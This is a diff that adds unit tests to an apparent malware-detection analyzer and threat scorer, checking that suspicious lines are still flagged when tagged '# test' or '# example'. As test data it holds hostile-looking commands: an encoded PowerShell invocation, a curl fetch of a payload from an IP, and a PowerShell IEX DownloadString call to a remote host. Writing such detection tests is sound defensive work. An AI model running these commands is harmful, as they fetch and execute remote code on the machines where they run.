@@ -44,3 +44,22 @@ class FalsePositiveReductionTests(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+class StrongIndicatorTests(unittest.TestCase):
+    def test_real_indicators_not_suppressed(self):
+        from analyzer import CodeAnalyzer
+        a = CodeAnalyzer.__new__(CodeAnalyzer)
+        for line in ("powershell -enc SQBFAFgA  # test", "curl http://1.2.3.4/payload safe",
+                     "IEX (New-Object Net.WebClient).DownloadString('https://x.io/a') # example"):
+            self.assertFalse(a._is_likely_contextual_false_positive(line), line)
+        self.assertTrue(a._is_likely_contextual_false_positive("# example: powershell usage"))
+
+
+class ScorerHardeningTests(unittest.TestCase):
+    def test_strong_indicator_not_zeroed(self):
+        from threat_scorer import EnhancedThreatScorer
+        f = {"pattern_name": "x", "malicious_line": "powershell -enc AAA # test", "file": "a.ps1"}
+        self.assertFalse(EnhancedThreatScorer._is_likely_contextual_false_positive(f))
+        g = {"pattern_name": "x", "malicious_line": "latest build", "file": "a.py"}
+        self.assertFalse(EnhancedThreatScorer._is_likely_contextual_false_positive(g))
+
